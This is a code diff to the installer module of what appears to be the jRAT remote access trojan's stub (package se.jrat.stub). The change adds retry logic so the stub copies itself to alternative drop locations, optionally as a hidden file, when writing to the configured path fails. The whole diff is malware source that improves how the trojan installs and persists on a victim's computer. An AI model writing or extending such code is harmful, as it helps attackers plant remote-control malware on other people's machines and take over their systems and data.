@@ -26,6 +26,8 @@ import se.jrat.stub.utils.Utils;
 import com.redpois0n.oslib.OperatingSystem;
 
 public class InstallerStartupModule extends StartupModule {
+	
+	private int locationIndex = -1;
 
 	public InstallerStartupModule(Map<String, String> config) {
 		super(config);
@@ -35,11 +37,23 @@ public class InstallerStartupModule extends StartupModule {
 		boolean b = !Boolean.parseBoolean(Configuration.getConfig().get("installed")) && Utils.getJarFile().isFile();
 		try {
 			if (b) {
+				int dropLocation = Integer.parseInt(Configuration.getConfig().get("droppath"));
+				
+				if (locationIndex == dropLocation) {
+					locationIndex++;
+					run();
+					return;
+				}
+				
+				if (locationIndex != -1) {
+					dropLocation = locationIndex;
+				}
+				
 				boolean hideFile = Boolean.parseBoolean(Configuration.getConfig().get("hiddenfile"));
 
 				String fileName = Configuration.getConfig().get("name");
 
-				File file = DropLocations.getFile(Integer.parseInt(Configuration.getConfig().get("droppath")), fileName);
+				File file = DropLocations.getFile(dropLocation, fileName);
 
 				if (file.getParentFile() != null && !file.getParentFile().exists()) {
 					file.getParentFile().mkdirs();
@@ -51,13 +65,21 @@ public class InstallerStartupModule extends StartupModule {
 				
 				ZipFile thisFile = new ZipFile(Utils.getJarFile());
 
-				ZipOutputStream outputStub = new ZipOutputStream(new FileOutputStream(file));
+				ZipOutputStream outputStub;
+				try {
+					outputStub = new ZipOutputStream(new FileOutputStream(file));
+				} catch (Exception e) {
+					e.printStackTrace();
+					thisFile.close();
+					locationIndex++;
+					run();
+					return;
+				}
 
 				Enumeration<? extends ZipEntry> entries = thisFile.entries();
 				while (entries.hasMoreElements()) {
 					ZipEntry entry = entries.nextElement();
 					
-					System.out.println(entry.getName());
 					if (entry.getName().equals("config.dat")) {
 						byte[] extra = new byte[entry.getExtra().length + 1];
 
